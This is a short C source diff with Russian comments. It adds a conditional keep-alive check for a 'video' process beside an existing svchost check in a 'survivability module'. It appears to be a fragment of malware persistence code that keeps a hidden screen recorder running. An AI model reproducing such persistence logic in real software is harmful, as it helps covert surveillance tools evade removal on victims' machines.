@@ -108,6 +108,11 @@ void ExplorerStart(PEventData Data)
 	// Запускаем модуль живучести
 	#ifdef KeepAliveH
 		KeepAliveCheckProcess(PROCESS_SVCHOST);
+		#ifdef VideoRecorderH
+			#ifdef VideoProcessSvchost
+				KeepAliveCheckProcess(PROCESS_VIDEO);
+			#endif 
+		#endif
 	#endif
 
 
